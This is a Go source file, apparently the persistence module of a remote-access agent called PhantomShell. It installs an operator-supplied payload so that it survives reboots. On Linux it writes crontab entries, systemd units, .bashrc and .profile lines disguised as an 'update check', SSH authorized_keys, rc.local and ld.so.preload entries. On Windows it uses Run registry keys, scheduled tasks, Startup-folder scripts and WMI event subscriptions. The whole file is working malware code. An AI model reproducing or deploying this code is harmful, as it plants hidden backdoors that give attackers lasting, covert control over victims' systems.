package modules

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/OmonovSarvar/PhantomShell/agents/go/core"
)

func RegisterPersist(d *core.Dispatcher, exec *core.Executor) {
	d.Register("persist", handlePersist(exec))
	d.Register("persist_list", handlePersistList)
}

func handlePersist(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		method := getString(args, "method")
		payload := getString(args, "payload") // command or binary path to persist
		name := getString(args, "name")
		if name == "" {
			name = "syshelper"
		}

		if payload == "" {
			return map[string]interface{}{"status": "error", "error": "payload required"}
		}

		if runtime.GOOS == "windows" {
			return persistWindows(exec, method, payload, name)
		}
		return persistLinux(exec, method, payload, name)
	}
}

func persistLinux(exec *core.Executor, method, payload, name string) map[string]interface{} {
	switch method {
	case "cron":
		cronLine := fmt.Sprintf("* * * * * %s", payload)
		cmd := fmt.Sprintf(`(crontab -l 2>/dev/null; echo "%s") | crontab -`, cronLine)
		_, stderr, code := exec.Run(cmd, 0)
		if code != 0 {
			// Fallback: write directly to spool
			spoolPath := fmt.Sprintf("/var/spool/cron/crontabs/%s", os.Getenv("USER"))
			if err := appendToFile(spoolPath, cronLine+"\n"); err != nil {
				return map[string]interface{}{"status": "error", "error": fmt.Sprintf("cron: %s / %s", stderr, err)}
			}
		}
		return map[string]interface{}{"status": "success", "method": "cron"}

	case "systemd":
		unit := fmt.Sprintf(`[Unit]
Description=%s Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
`, name, payload)
		unitPath := fmt.Sprintf("/etc/systemd/system/%s.service", name)
		if err := os.WriteFile(unitPath, []byte(unit), 0644); err != nil {
			return map[string]interface{}{"status": "error", "error": err.Error()}
		}
		exec.Run("systemctl daemon-reload", 0)
		exec.Run(fmt.Sprintf("systemctl enable %s.service", name), 0)
		return map[string]interface{}{"status": "success", "method": "systemd", "path": unitPath}

	case "bashrc":
		home := os.Getenv("HOME")
		rcPath := filepath.Join(home, ".bashrc")
		line := fmt.Sprintf("\n# system update check\nnohup %s >/dev/null 2>&1 &\n", payload)
		if err := appendToFile(rcPath, line); err != nil {
			return map[string]interface{}{"status": "error", "error": err.Error()}
		}
		return map[string]interface{}{"status": "success", "method": "bashrc", "path": rcPath}

	case "profile":
		home := os.Getenv("HOME")
		profPath := filepath.Join(home, ".profile")
		line := fmt.Sprintf("\n%s >/dev/null 2>&1 &\n", payload)
		if err := appendToFile(profPath, line); err != nil {
			return map[string]interface{}{"status": "error", "error": err.Error()}
		}
		return map[string]interface{}{"status": "success", "method": "profile", "path": profPath}

	case "ssh_key":
		pubKey := getString(map[string]interface{}{"k": payload}, "k")
		home := os.Getenv("HOME")
		sshDir := filepath.Join(home, ".ssh")
		os.MkdirAll(sshDir, 0700)
		authPath := filepath.Join(sshDir, "authorized_keys")
		if err := appendToFile(authPath, "\n"+pubKey+"\n"); err != nil {
			return map[string]interface{}{"status": "error", "error": err.Error()}
		}
		os.Chmod(authPath, 0600)
		return map[string]interface{}{"status": "success", "method": "ssh_key", "path": authPath}

	case "rc_local":
		rcPath := "/etc/rc.local"
		content := fmt.Sprintf("#!/bin/sh\n%s &\nexit 0\n", payload)
		existing, err := os.ReadFile(rcPath)
		if err == nil {
			// Insert before 'exit 0'
			old := string(existing)
			if strings.Contains(old, "exit 0") {
				content = strings.Replace(old, "exit 0", fmt.Sprintf("%s &\nexit 0", payload), 1)
			}
		}
		if err := os.WriteFile(rcPath, []byte(content), 0755); err != nil {
			return map[string]interface{}{"status": "error", "error": err.Error()}
		}
		return map[string]interface{}{"status": "success", "method": "rc_local", "path": rcPath}

	case "ld_preload":
		// Write a shared object path to /etc/ld.so.preload
		if err := appendToFile("/etc/ld.so.preload", payload+"\n"); err != nil {
			return map[string]interface{}{"status": "error", "error": err.Error()}
		}
		return map[string]interface{}{"status": "success", "method": "ld_preload"}

	default:
		return map[string]interface{}{
			"status": "error",
			"error":  fmt.Sprintf("unknown method: %s (linux methods: cron, systemd, bashrc, profile, ssh_key, rc_local, ld_preload)", method),
		}
	}
}

func persistWindows(exec *core.Executor, method, payload, name string) map[string]interface{} {
	switch method {
	case "registry":
		cmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%s" /t REG_SZ /d "%s" /f`, name, payload)
		_, stderr, code := exec.Run(cmd, 0)
		if code != 0 {
			return map[string]interface{}{"status": "error", "error": stderr}
		}
		return map[string]interface{}{"status": "success", "method": "registry"}

	case "schtask":
		cmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc onlogon /rl highest /f`, name, payload)
		_, stderr, code := exec.Run(cmd, 0)
		if code != 0 {
			return map[string]interface{}{"status": "error", "error": stderr}
		}
		return map[string]interface{}{"status": "success", "method": "schtask"}

	case "startup":
		startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
		batPath := filepath.Join(startupDir, name+".bat")
		content := fmt.Sprintf("@echo off\nstart /b \"\" \"%s\"\n", payload)
		if err := os.WriteFile(batPath, []byte(content), 0644); err != nil {
			return map[string]interface{}{"status": "error", "error": err.Error()}
		}
		return map[string]interface{}{"status": "success", "method": "startup", "path": batPath}

	case "wmi":
		// WMI event subscription for persistence
		filter := fmt.Sprintf(`wmic /namespace:"\\root\subscription" path __EventFilter create Name="%s", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`, name)
		consumer := fmt.Sprintf(`wmic /namespace:"\\root\subscription" path CommandLineEventConsumer create Name="%s", CommandLineTemplate="%s"`, name, payload)
		binding := fmt.Sprintf(`wmic /namespace:"\\root\subscription" path __FilterToConsumerBinding create Filter='__EventFilter.Name="%s"', Consumer='CommandLineEventConsumer.Name="%s"'`, name, name)

		exec.Run(filter, 0)
		exec.Run(consumer, 0)
		_, stderr, code := exec.Run(binding, 0)
		if code != 0 {
			return map[string]interface{}{"status": "error", "error": stderr}
		}
		return map[string]interface{}{"status": "success", "method": "wmi"}

	default:
		return map[string]interface{}{
			"status": "error",
			"error":  fmt.Sprintf("unknown method: %s (windows methods: registry, schtask, startup, wmi)", method),
		}
	}
}

func handlePersistList(args map[string]interface{}) map[string]interface{} {
	if runtime.GOOS == "windows" {
		return map[string]interface{}{
			"status":  "success",
			"methods": []string{"registry", "schtask", "startup", "wmi"},
		}
	}
	return map[string]interface{}{
		"status":  "success",
		"methods": []string{"cron", "systemd", "bashrc", "profile", "ssh_key", "rc_local", "ld_preload"},
	}
}

func appendToFile(path, content string) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(content)
	return err
}
